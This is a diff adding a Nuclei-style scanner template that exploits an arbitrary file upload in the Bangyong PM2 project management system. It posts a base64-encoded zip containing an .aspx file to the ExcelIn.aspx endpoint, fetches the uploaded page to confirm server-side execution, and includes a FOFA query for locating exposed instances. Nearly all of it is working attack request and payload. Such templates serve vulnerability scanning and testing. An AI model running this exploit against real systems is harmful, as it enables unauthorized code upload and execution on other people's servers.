@@ -1,0 +1,63 @@
+id: PM2-ExcelIn-fileupload
+ 
+info:
+  name: 邦永PM2项目管理系统-任意文件上传-ExcelIn
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="PM2项目管理系统BS版增强工具.zip"
+
+  tags: File Upload 
+
+http:
+  - raw:
+      - |
+        POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------335518608136410266804188096265
+        Origin: 
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Cookie: ASP.NET_SessionId=hovcho2iwrxygzgkt0l2oomc
+
+
+        -----------------------------335518608136410266804188096265
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        CX8CDdAjNN9+19sa3xOCEybpUx0hn5DnMqGQQzm1JI+njfE/pGi9oDDI5PRCH8wVs/UCahOCnHho2chhS8X5jCYrh1hzlOaS5VIl/VYxh3LhmXkQwsOYhNFmg9+ZmmilXRKT5WAN6WceP6U9c1Kqtw==
+        -----------------------------335518608136410266804188096265
+        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+        FD259C0F
+        -----------------------------335518608136410266804188096265
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+        dvfybORq87SoxN9g6GB9Qryd4qSb5ynAZtDiE0yV2TwdNpGBHpvAVQSmjJzCuqbm/b0rSjXag7dSZXfX041XcbqxqzunkN0F88hB7kUvvb8RZ0DDlXcuuntLzH6gkJYF
+        -----------------------------335518608136410266804188096265
+        Content-Disposition: form-data; name="FileUpload1"; filename="1.zip"
+        Content-Type: application/x-zip-compressed
+
+        {{base64_decode("UEsDBBQACAAIAKRMBlkAAAAAAAAAAF8AAAAGACAAMS5hc3B4VVQNAAdEfrFmRX6xZkR+sWZ1eAsAAQT1AQAABBQAAACzUXUISExPVfBJzEsvBTJslZyVlVTtbFSDUosL8vOKU/XCizJLUjWUDI2MjQyVNK2DK4tLUnP1PP313DJzUvVcUnNSgdJBqYWlqcUlegEZlcWZyYk5AYklGZrWqnYAUEsHCGXqaLBeAAAAXwAAAFBLAwQUAAgACACkTAZZAAAAAAAAAAD0AAAAEQAgAF9fTUFDT1NYLy5fMS5hc3B4VVQNAAdEfrFmRX6xZkp+sWZ1eAsAAQT1AQAABBQAAABjYBVjZ2BiYPBNTFbwD1aIUIACkBgDJxAbAfEhIAbxvzAQBRxDQoKgTJCOA0BsgqaECSouwMAglZyfq5dYUJCTqpeTWFxSWpyakpJYkqocEAxVewGIVRgYRBHqCksTixLzSjLzUhkqajamgRStlEqTA9GF+gYGFkbWZmZJhubJZpbWmUGZ6RklvvlAY2MqjAwCivKtGQBQSwcIM2EXjpYAAAD0AAAAUEsBAhQDFAAIAAgApEwGWWXqaLBeAAAAXwAAAAYAIAAAAAAAAAAAAKSBAAAAADEuYXNweFVUDQAHRH6xZkV+sWZEfrFmdXgLAAEE9QEAAAQUAAAAUEsBAhQDFAAIAAgApEwGWTNhF46WAAAA9AAAABEAIAAAAAAAAAAAAKSBsgAAAF9fTUFDT1NYLy5fMS5hc3B4VVQNAAdEfrFmRX6xZkp+sWZ1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCzAAAApwEAAAAA")}}
+        -----------------------------335518608136410266804188096265
+        Content-Disposition: form-data; name="Button1"
+
+        模块导入
+        -----------------------------335518608136410266804188096265--
+      - |
+        GET /FlowChartDefine/1.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68
+ 
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - "12321"
+      condition: and
